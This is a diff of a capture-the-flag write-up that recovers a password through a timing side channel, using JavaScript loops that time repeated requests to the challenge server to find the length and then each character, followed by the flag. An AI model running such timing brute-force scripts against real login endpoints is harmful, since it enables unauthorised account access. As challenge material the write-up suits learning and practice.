@@ -77,13 +77,12 @@ function submitForm() {
 ```
 Since `checkPassword()` first checks lengths, we need to find the password length first before guessing characters:
 ```js
-(async () => {
-    for (let i = 0; i <= 10; ++i) {
+(async () => { // IIFE (to use await) not necessary on Chrome
+    for (let i = 1; i <= 10; ++i) {
         const pwd = "a".repeat(i);
         const q = pwd.split("").map(c=>encryptRSA(c.charCodeAt(0))).join(); // arr.join()
         const t = performance.now(); // timing start
         await fetch(`http://litctf.live:31776/verify?password=${q}`, {
-            "method": "GET",
             "redirect": "manual", // to ignore the redirect
         });
         console.log(pwd, performance.now()-t); // timing end
@@ -115,7 +114,6 @@ await (async () => {
         const q = pwd.split("").map(c=>encryptRSA(c.charCodeAt(0))).join();
         try {
             const res = await fetch(`http://litctf.live:31776/verify?password=${q}`, {
-                "method": "GET",
                 "redirect": "error", // so only the correct one doesn't error
             });
             return await res.text();
@@ -132,3 +130,7 @@ Yay!
 ## Flag
 
 `LITCTF{uwu_st3ph4ni3_i5_s0_0rz_0rz_0TZ}`
+
+## Notes
+
+At first I averaged trials, but then it got painfully slow so I tried just one each and it worked. Also, for the last character, I originally just manually guessed until I got it right! (Lots of rickrolling there...)
